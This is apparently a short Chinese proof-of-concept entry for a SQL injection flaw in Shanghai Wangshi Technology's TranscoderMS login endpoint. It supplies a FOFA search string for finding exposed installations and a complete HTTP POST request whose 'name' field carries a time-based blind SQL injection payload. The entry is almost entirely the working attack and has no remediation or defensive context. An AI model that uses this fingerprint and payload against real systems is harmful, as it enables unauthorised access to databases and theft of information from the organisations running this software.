# 上海网仕科技TranscoderMS index存在SQL注入

上海网仕科技存在未授权访问sql漏洞，易造成信息泄露

## fofa
```
"webtrans//js/md5-min.js"
```

## poc
```javascript
POST /webtrans/index.php?controller=user&action=login HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

name=test111;') AND (SELECT 1 FROM (SELECT(SLEEP(5)))xSEI) AND ('aFKS'='aFKS&pass=MTExMTExMTExMTExMTExMTExMTExMTExMTEx&lang=zh_CN
```
